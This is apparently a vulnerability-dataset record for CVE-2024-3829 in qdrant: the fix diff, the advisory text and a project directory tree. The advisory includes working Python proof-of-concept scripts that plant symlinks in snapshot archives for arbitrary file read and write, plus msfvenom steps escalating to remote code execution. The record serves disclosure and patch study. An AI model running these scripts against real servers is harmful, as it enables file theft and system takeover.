{
    "published_date": "2024-06-03T10:05:53.960Z",
    "patch_commits": [
        {
            "url": "https://github.com/qdrant/qdrant/commit/ee7a31ec3459a6a4219200234615c1817ab82260",
            "content": "Fix snapshot tar symlinks validation (#4033)\n\n* add validation for snapshot archives for not containing any symlinks\r\n\r\n* fix for test\r\n\r\n* fmt\r\n\r\n* Only allow regular file and directory entry types in snapshot archives\r\n\r\n---------\r\n\r\nCo-authored-by: timvisee <tim@visee.me>\n\nFilename: lib/collection/src/collection/snapshots.rs:\n```\n@@ -8,6 +8,7 @@\nuse tokio::fs;\n use super::Collection;\n use crate::collection::CollectionVersion;\n use crate::common::snapshots_manager::SnapshotStorageManager;\n+use crate::common::validate_snapshot_archive::validate_open_snapshot_archive;\n use crate::config::{CollectionConfig, ShardingMethod};\n use crate::operations::snapshot_ops::SnapshotDescription;\n use crate::operations::types::{CollectionError, CollectionResult, NodeType};\n\n@@ -187,8 +188,7 @@\nimpl Collection {\n         is_distributed: bool,\n     ) -> CollectionResult<()> {\n         // decompress archive\n-        let archive_file = std::fs::File::open(snapshot_path)?;\n-        let mut ar = tar::Archive::new(archive_file);\n+        let mut ar = validate_open_snapshot_archive(snapshot_path)?;\n         ar.unpack(target_dir)?;\n \n         let config = CollectionConfig::load(target_dir)?;\n```\n\nFilename: lib/collection/src/common/mod.rs:\n```\n@@ -9,3 +9,4 @@\npub mod snapshots_manager;\n pub mod stoppable_task;\n pub mod stoppable_task_async;\n pub mod stopping_guard;\n+pub mod validate_snapshot_archive;\n```\n\nFilename: lib/collection/src/common/validate_snapshot_archive.rs:\n```\n@@ -0,0 +1,13 @@\n+use std::fs::File;\n+use std::path::Path;\n+\n+use segment::common::validate_snapshot_archive::open_snapshot_archive_with_validation;\n+use tar::Archive;\n+\n+use crate::operations::types::CollectionResult;\n+\n+pub fn validate_open_snapshot_archive<P: AsRef<Path>>(\n+    archive_path: P,\n+) -> CollectionResult<Archive<File>> {\n+    Ok(open_snapshot_archive_with_validation(archive_path)?)\n+}\n```\n\nFilename: lib/collection/src/shards/shard_holder.rs:\n```\n@@ -12,6 +12,7 @@\nuse tokio::sync::RwLock;\n \n use super::replica_set::AbortShardTransfer;\n use super::transfer::transfer_tasks_pool::TransferTasksPool;\n+use crate::common::validate_snapshot_archive::validate_open_snapshot_archive;\n use crate::config::{CollectionConfig, ShardingMethod};\n use crate::hash_ring::HashRing;\n use crate::operations::shard_selector_internal::ShardSelectorInternal;\n\n@@ -802,14 +803,13 @@\nimpl ShardHolder {\n             return Err(shard_not_found_error(shard_id));\n         }\n \n-        let snapshot = std::fs::File::open(snapshot_path)?;\n-\n         if !temp_dir.exists() {\n             std::fs::create_dir_all(temp_dir)?;\n         }\n \n         let snapshot_file_name = snapshot_path.file_name().unwrap().to_string_lossy();\n \n+        let snapshot_path = snapshot_path.to_path_buf();\n         let snapshot_temp_dir = tempfile::Builder::new()\n             .prefix(&format!(\n                 \"{collection_name}-shard-{shard_id}-{snapshot_file_name}\"\n\n@@ -822,7 +822,7 @@\nimpl ShardHolder {\n             cancel::blocking::spawn_cancel_on_token(\n                 cancel.child_token(),\n                 move |cancel| -> CollectionResult<_> {\n-                    let mut tar = tar::Archive::new(snapshot);\n+                    let mut tar = validate_open_snapshot_archive(snapshot_path)?;\n \n                     if cancel.is_cancelled() {\n                         return Err(cancel::Error::Cancelled.into());\n```\n\nFilename: lib/collection/src/tests/snapshot_test.rs:\n```\n@@ -72,10 +72,7 @@\nasync fn _test_snapshot_collection(node_type: NodeType) {\n \n     let snapshots_path = Builder::new().prefix(\"test_snapshots\").tempdir().unwrap();\n     let collection_dir = Builder::new().prefix(\"test_collection\").tempdir().unwrap();\n-    let recover_dir = Builder::new()\n-        .prefix(\"test_collection_rec\")\n-        .tempdir()\n-        .unwrap();\n+\n     let collection_name = \"test\".to_string();\n     let collection_name_rec = \"test_rec\".to_string();\n     let mut shards = HashMap::new();\n\n@@ -115,14 +112,26 @@\nasync fn _test_snapshot_collection(node_type: NodeType) {\n         .unwrap();\n \n     assert_eq!(snapshot_description.checksum.unwrap().len(), 64);\n-    // Do not recover in local mode if some shards are remote\n-    assert!(Collection::restore_snapshot(\n-        &snapshots_path.path().join(&snapshot_description.name),\n-        recover_dir.path(),\n-        0,\n-        false,\n-    )\n-    .is_err());\n+\n+    {\n+        let recover_dir = Builder::new()\n+            .prefix(\"test_collection_rec\")\n+            .tempdir()\n+            .unwrap();\n+        // Do not recover in local mode if some shards are remote\n+        assert!(Collection::restore_snapshot(\n+            &snapshots_path.path().join(&snapshot_description.name),\n+            recover_dir.path(),\n+            0,\n+            false,\n+        )\n+        .is_err());\n+    }\n+\n+    let recover_dir = Builder::new()\n+        .prefix(\"test_collection_rec\")\n+        .tempdir()\n+        .unwrap();\n \n     if let Err(err) = Collection::restore_snapshot(\n         &snapshots_path.path().join(snapshot_description.name),\n```\n\nFilename: lib/segment/src/common/mod.rs:\n```\n@@ -8,6 +8,7 @@\npub mod rocksdb_buffered_delete_wrapper;\n pub mod rocksdb_buffered_update_wrapper;\n pub mod rocksdb_wrapper;\n pub mod utils;\n+pub mod validate_snapshot_archive;\n pub mod vector_utils;\n pub mod version;\n```\n\nFilename: lib/segment/src/common/validate_snapshot_archive.rs:\n```\n@@ -0,0 +1,45 @@\n+use std::fs::File;\n+use std::path::Path;\n+\n+use tar::Archive;\n+\n+use crate::common::operation_error::{OperationError, OperationResult};\n+\n+pub fn open_snapshot_archive_with_validation<P: AsRef<Path>>(\n+    snapshot_path: P,\n+) -> OperationResult<Archive<File>> {\n+    let path = snapshot_path.as_ref();\n+    {\n+        let archive_file = File::open(path).map_err(|err| {\n+            OperationError::service_error(format!(\n+                \"failed to open segment snapshot archive {path:?}: {err}\"\n+            ))\n+        })?;\n+        let mut ar = Archive::new(archive_file);\n+\n+        for entry in ar.entries_with_seek()? {\n+            let entry_type = entry?.header().entry_type();\n+            if !matches!(\n+                entry_type,\n+                tar::EntryType::Regular | tar::EntryType::Directory,\n+            ) {\n+                return Err(OperationError::ValidationError {\n+                    description: format!(\n+                        \"Malformed snapshot, tar archive contains {entry_type:?} entry\",\n+                    ),\n+                });\n+            }\n+        }\n+    }\n+\n+    let archive_file = File::open(path).map_err(|err| {\n+        OperationError::service_error(format!(\n+            \"failed to open segment snapshot archive {path:?}: {err}\"\n+        ))\n+    })?;\n+\n+    let mut ar = Archive::new(archive_file);\n+    ar.set_overwrite(false);\n+\n+    Ok(ar)\n+}\n```\n\nFilename: lib/segment/src/segment.rs:\n```\n@@ -21,6 +21,7 @@\nuse crate::common::operation_error::OperationError::TypeInferenceError;\n use crate::common::operation_error::{\n     get_service_error, OperationError, OperationResult, SegmentFailedState,\n };\n+use crate::common::validate_snapshot_archive::open_snapshot_archive_with_validation;\n use crate::common::version::{StorageVersion, VERSION_FILE};\n use crate::common::{check_named_vectors, check_query_vectors, check_stopped, check_vector_name};\n use crate::data_types::named_vectors::NamedVectors;\n\n@@ -474,20 +475,14 @@\nimpl Segment {\n     pub fn restore_snapshot(snapshot_path: &Path, segment_id: &str) -> OperationResult<()> {\n         let segment_path = snapshot_path.parent().unwrap().join(segment_id);\n \n-        let archive_file = File::open(snapshot_path).map_err(|err| {\n+        let mut archive = open_snapshot_archive_with_validation(snapshot_path)?;\n+\n+        archive.unpack(&segment_path).map_err(|err| {\n             OperationError::service_error(format!(\n-                \"failed to open segment snapshot archive {snapshot_path:?}: {err}\"\n+                \"failed to unpack segment snapshot archive {snapshot_path:?}: {err}\"\n             ))\n         })?;\n \n-        tar::Archive::new(archive_file)\n-            .unpack(&segment_path)\n-            .map_err(|err| {\n-                OperationError::service_error(format!(\n-                    \"failed to unpack segment snapshot archive {snapshot_path:?}: {err}\"\n-                ))\n-            })?;\n-\n         let snapshot_path = segment_path.join(SNAPSHOT_PATH);\n \n         if snapshot_path.exists() {\n```\n\nFilename: src/snapshots.rs:\n```\n@@ -2,6 +2,7 @@\nuse std::fs::{self, remove_dir_all, rename};\n use std::path::{Path, PathBuf};\n \n use collection::collection::Collection;\n+use collection::common::validate_snapshot_archive::validate_open_snapshot_archive;\n use collection::shards::shard::PeerId;\n use log::info;\n use storage::content_manager::alias_mapping::AliasPersistence;\n\n@@ -94,8 +95,7 @@\npub fn recover_full_snapshot(\n     fs::create_dir_all(&snapshot_temp_path).unwrap();\n \n     // Un-tar snapshot into temporary directory\n-    let archive_file = fs::File::open(snapshot_path).unwrap();\n-    let mut ar = tar::Archive::new(archive_file);\n+    let mut ar = validate_open_snapshot_archive(snapshot_path).unwrap();\n     ar.unpack(&snapshot_temp_path).unwrap();\n \n     // Read configuration file with snapshot-to-collection mapping\n```"
        }
    ],
    "sw_version": "v1.8.4",
    "sw_version_wget": "https://github.com/qdrant/qdrant/archive/refs/tags/v1.8.4.zip",
    "description": "qdrant/qdrant version 1.9.0-dev is vulnerable to arbitrary file read and write during the snapshot recovery process. Attackers can exploit this vulnerability by manipulating snapshot files to include symlinks, leading to arbitrary file read by adding a symlink that points to a desired file on the filesystem and arbitrary file write by including a symlink and a payload file in the snapshot's directory structure. This vulnerability allows for the reading and writing of arbitrary files on the server, which could potentially lead to a full takeover of the system. The issue is fixed in version v1.9.0.",
    "sec_adv": [
        {
            "url": "https://huntr.com/bounties/abd9c906-75ee-4d84-b76d-ce1386401e08",
            "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nArbitrary file read and write during snapshot recovery in qdrant/qdrant\nValid\nReported on Apr 11th 2024\nDescription\nRecovering collections from malicious snapshot files leads to arbitrary file read and write. It is mostly to do with adding symlinks in the right places to trip the recovery process into reading and writing from files on the file system.\nFor reading it is enough to add a symlink 0/wal/some_file that points to a desired file on the filesystem. Then use that modified snapshot file to recover a collection, create a snapshot again for that recovered collection and retrieve it. This snapshot will have contents of the file that symlink pointed to.\nWriting is a little bit more involved. Snapshot file will contain a directory structure like this:\n./shard_key_mapping.json\n./payload_index.json\n./config.json\n./version.info\n./0\n./0/shard_config.json\n./0/replica_state.json\n./0/wal\n./0/wal/open-1\n./0/wal/open-2\n./0/segments\n./0/segments/9700a286-9718-4e9d-abf2-ce734bd3a2ff.tar\n./0/segments/75d72917-84b0-4675-b49b-0b802ff0c15a.tar\n...\nDuring recovery process it will unpack into a tmp directory, then at some point will iterate over files in /0/segments/ looking for .tar files (/qdrant/lib/collection/src/shards/local_shard/mod.rs#L610).\nOnce such file is found (for example ./0/segments/9700a286-9718-4e9d-abf2-ce734bd3a2ff.tar), it will extract it to ./0/segments/9700a286-9718-4e9d-abf2-ce734bd3a2ff\n// qdrant/lib/segment/src/segment.rs#L470\n    pub fn restore_snapshot(snapshot_path: &Path, segment_id: &str) -> OperationResult<()> {\n        let segment_path = snapshot_path.parent().unwrap().join(segment_id);\n\n        let archive_file = File::open(snapshot_path).map_err(|err| {\n            OperationError::service_error(format!(\n                \"failed to open segment snapshot archive {snapshot_path:?}: {err}\"\n            ))\n        })?;\n\n        tar::Archive::new(archive_file)\n            .unpack(&segment_path)\n            .map_err(|err| {\n                OperationError::service_error(format!(\n                    \"failed to unpack segment snapshot archive {snapshot_path:?}: {err}\"\n                ))\n            })?;\nNotice that it will use a predictable name for this directory which is just the filename without the .tar suffix. We can again add a symlink with that name that points to a desired target location, and the contents of the .tar file would contain a payload file.\nBoth vulnerabilities can be fixed by making sure there are no symlinks in the tar archive.\nProof of Concept\n$ docker run -p 6333:6333 --name qdrant_poc qdrant/qdrant:dev\n...\n\n$ python poc_read.py --url='http://localhost:6333' --path='/etc/passwd'\ncreated collection c_855e572f\ncreated snapshot c_855e572f-3703029910300666-2024-04-11-09-44-47.snapshot\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n...\n\n$ echo poc > payload.txt\n$ python poc_write.py --url='http://localhost:6333' --local_path='payload.txt' --remote_path='/root/poc.txt'\n\n$ docker exec -it qdrant_poc ls -la /root\ntotal 24\ndrwx------ 1 root root 4096 Apr 11 09:47 .\ndrwxr-xr-x 1 root root 4096 Apr 11 09:46 ..\n-rw------- 1 root root   14 Apr 11 09:47 .bash_history\n-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc\n-rw-r--r-- 1 root root  161 Jul  9  2019 .profile\n-rw-r--r-- 1 root root    4 Apr 11 09:46 poc.txt\n\n$ docker exec -it qdrant_poc cat /root/poc.txt\npoc\n\n# for RCE (this will work as long as /qdrant/qdrant is writable, doesn't need to be root):\n$ msfvenom -p linux/x64/exec CMD='touch /tmp/touched_by_rce' -f elf > rev\n$ chmod +x rev\n# this will overwrite `/qdrant/qdrant`, but `/proc/self/exe` (relevant in `/stacktrace` endpoint) will now point \n# to `/qdrant/qdrant (deleted)`\n$ python poc_write.py --url='http://localhost:6333' --local_path='rev' --remote_path='/qdrant/qdrant'\n# but apparently we can just create this file and all will be fine :))\n$ python poc_write.py --url='http://localhost:6333' --local_path='rev' --remote_path='/qdrant/qdrant (deleted)'\n$ curl http://localhost:6333/stacktrace\n$ docker exec -it qdrant_poc ls -la /tmp\ntotal 8\ndrwxrwxrwt 1 root root 4096 Apr 11 13:23 .\ndrwxr-xr-x 1 root root 4096 Apr 11 13:22 ..\n-rw-r--r-- 1 root root    0 Apr 11 13:23 touched_by_rce\n# poc_read.py\nimport tarfile\n\nfrom io import BytesIO\nfrom random import randbytes\nfrom argparse import ArgumentParser\nfrom requests import Session\n\nfrom urllib.parse import quote, unquote\n\nif __name__ == \"__main__\":\n    parser = ArgumentParser()\n    parser.add_argument(\"--url\", default=\"http://localhost:6333\")\n    parser.add_argument(\"--path\", default=\"/etc/passwd\")\n    args = parser.parse_args()\n\n    url_base = args.url\n\n    with Session() as s:\n        # create a new collection:\n        cname = \"c_\" + randbytes(4).hex()\n        rsp = s.put(f\"{url_base}/collections/{cname}\", json={})\n        print(f\"created collection {cname}\")\n\n        # create and retrieve a snapshot:\n        rsp = s.post(f\"{url_base}/collections/{cname}/snapshots\", json={})\n        sname = rsp.json()[\"result\"][\"name\"]\n\n        rsp = s.get(f\"{url_base}/collections/{cname}/snapshots/{sname}\")\n        snapshot = BytesIO(rsp.content)\n        print(f\"created snapshot {sname}\")\n\n        # cleanup:\n        s.delete(f\"{url_base}/collections/{cname}/snapshots/{sname}\")\n        s.delete(f\"{url_base}/collections/{cname}\")\n\n        # add a symlink to the snapshot tar file:\n        with tarfile.open(fileobj=snapshot, mode=\"a\") as tar:\n            info = tarfile.TarInfo(\"0/wal/sneaky\")\n            info.type = tarfile.SYMTYPE\n            # you can also symlink to a directory to recursively includes all the files (and leak file system tree)\n            info.linkname = args.path\n            tar.addfile(info)\n\n        # recreate the collection from that modified snapshot:\n        rsp = s.post(f\"{url_base}/collections/{cname}/snapshots/upload\", files={\n            \"snapshot\" : (\"x.snapshot\", snapshot.getvalue(), \"application/tar\")\n        })\n\n        # create a snapshot for this new collection; contents of symlinks will be\n        # copied into the archive as regular files:\n        rsp = s.post(f\"{url_base}/collections/{cname}/snapshots\", json={})\n        sname = rsp.json()[\"result\"][\"name\"]\n\n        rsp = s.get(f\"{url_base}/collections/{cname}/snapshots/{sname}\")\n        snapshot = BytesIO(rsp.content)\n\n        with tarfile.open(fileobj=snapshot, mode=\"r\") as tar:\n            #  print(tar.getmembers()\n            buf = tar.extractfile(\"0/wal/sneaky\").read()\n\n        try:\n            print(buf.decode())\n        except UnicodeDecodeError:\n            print(buf)\n\n        s.delete(f\"{url_base}/collections/{cname}/snapshots/x.snapshot\")\n        s.delete(f\"{url_base}/collections/{cname}/snapshots/{sname}\")\n        s.delete(f\"{url_base}/collections/{cname}\")\n# poc_write.py\nimport tarfile\nfrom io import BytesIO\nfrom random import randbytes\nfrom pathlib import Path\nfrom argparse import ArgumentParser\nfrom requests import Session\n\nif __name__ == \"__main__\":\n    parser = ArgumentParser()\n    parser.add_argument(\"--url\", default=\"http://localhost:6333\")\n    parser.add_argument(\"--remote_path\", default=\"/root/poc.txt\")\n    parser.add_argument(\"--local_path\", default=\"payload.txt\")\n    args = parser.parse_args()\n\n    cname = \"c_\" + randbytes(4).hex()\n\n    remote_path = Path(args.remote_path)\n\n    with Session() as s:\n        # create a new collection:\n        rsp = s.put(f\"{args.url}/collections/{cname}\", json={})\n\n        # create and retrieve a snapshot:\n        rsp = s.post(f\"{args.url}/collections/{cname}/snapshots\", json={})\n        sname = rsp.json()[\"result\"][\"name\"]\n\n        rsp = s.get(f\"{args.url}/collections/{cname}/snapshots/{sname}\")\n        snapshot = BytesIO(rsp.content)\n\n        # create a fake tar with payload, you can also set custom file attributes\n        # if you need the file to be executable, etc:\n        fake_tar = BytesIO()\n        with tarfile.open(fileobj=fake_tar, mode=\"w\") as tar:\n            tar.add(args.local_path, arcname=str(remote_path.name))\n\n        # modify the snapshot to add a new segment .tar with a payload and a pre-existing\n        # directory symlink with the same name (sans .tar);\n        # during recovery process it will try to extract the contents of redirect.tar to redirect/\n        with tarfile.open(fileobj=snapshot, mode=\"a\") as tar:\n            info = tarfile.TarInfo(f\"0/segments/redirect.tar\")\n            info.size = len(fake_tar.getvalue())\n            tar.addfile(info, fileobj=BytesIO(fake_tar.getvalue()))\n\n            info = tarfile.TarInfo(f\"0/segments/redirect\")\n            info.type = tarfile.SYMTYPE\n            info.linkname = str(remote_path.parent)\n            tar.addfile(info)\n\n        rsp = s.post(f\"{args.url}/collections/{cname}/snapshots/upload\", files={\n            \"snapshot\" : (\"x.snapshot\", snapshot.getvalue(), \"application/tar\")\n        })\n\n        rsp = s.delete(f\"{args.url}/collections/{cname}/snapshots/{sname}\")\n        rsp = s.delete(f\"{args.url}/collections/{cname}\")\n        rsp = s.delete(f\"{args.url}/collections/{cname}/snapshots/x.snapshot\")\nImpact\nThis vulnerability can write and overwrite arbitrary files on server, potentially leading to a full takeover.\nWe are processing your report and will contact theqdrant team within 24 hours.a year ago\nozelis modified the reporta year ago\nozelis modified the reporta year ago\nozelis modified the reporta year ago\nWe have contacted a member of theqdrant team and are waiting to hear backa year ago\nA qdrant/qdrant maintainerhas acknowledged this reporta year ago\nThe scheduled publication date was automatically extended from 27th May 2024  to 3rd Jun 2024  due to the maintainers acknowledgement of the reporta year ago\nA qdrant/qdrant maintainer validated this vulnerabilitya year ago\nHello Ozelis! Thanks so much for your report! I've confirmed this is a valid report. Thanks also for the great proof-of-concept code. We've pushed a fix to qdrant/qdrant:dev just now which should fix the issue by only allowing regular files and directories in tar files.\nThanks again!\nMac Chaffee\nozelishas been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-3829assigned to this report.a year ago\nA qdrant/qdrant maintainermarked this as fixedin v1.9.0with commitee7a31a year ago\nThe fix bounty has been dropped\nWe have sent a warning to the qdrant team to inform them that this report will be published in 48 hoursa year ago\nThis vulnerability has now been publisheda year ago\nCVE-2024-3829has now been publisheda year ago\nSign in to join this conversation\nCVE\nCVE-2024-3829\n(Published)\nVulnerability Type\nCWE-20: Improper Input Validation\nSeverity\nCritical (9.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator\nRegistry\nOther\nAffected Version\n1.9.0-dev\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$1500\nFix Bounty\n$375\nFound by\nozelis\n@ozelis\nMIDDLEWEIGHT\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\n\u00a9 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
            "effective": true,
            "effective_reason": "The security advisory explicitly includes proof-of-concept scripts and detailed exploitation methods to reproduce the described vulnerabilities."
        }
    ],
    "cwe": [
        {
            "id": "CWE-20",
            "value": "CWE-20 Improper Input Validation"
        }
    ],
    "dir_tree": ".\n\u251c\u2500\u2500 config\n\u251c\u2500\u2500 docs\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 grpc\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 imgs\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 redoc\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 master\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.10.0\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.10.1\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.10.2\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.10.3\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.10.4\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.10.5\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.11.0\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.11.1\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.11.2\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.11.3\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.11.4\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.11.5\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.11.6\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.11.7\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.4.2\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.5.0\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.5.1\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.6.0\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.7.0\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.8.0\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.8.1\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.8.2\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.8.3\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.8.4\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.8.5\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.8.6\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.9.0\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v0.9.1\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v1.0.1\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v1.0.2\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v1.0.3\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v1.1.0\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v1.1.1\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v1.1.2\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v1.1.3\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v1.2.x\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v1.3.x\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v1.4.x\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v1.5.x\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v1.6.x\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 v1.7.x\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 v1.8.x\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 roadmap\n\u251c\u2500\u2500 lib\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 api\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 src\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 grpc\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u2514\u2500\u2500 proto\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 rest\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 collection\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 benches\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 docs\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 src\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 collection\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 collection_manager\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 holders\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 optimizers\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 tests\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 common\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 grouping\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 lookup\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 operations\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 shards\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 local_shard\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 replica_set\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 transfer\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 tests\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 tests\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 integration\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0         \u2514\u2500\u2500 common\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 common\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 cancel\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 src\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 common\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 src\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 io\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 src\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 issues\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 src\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 problems\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 memory\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 src\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 rbac\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 src\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 segment\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 benches\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 src\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 common\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 data_types\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 entry\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 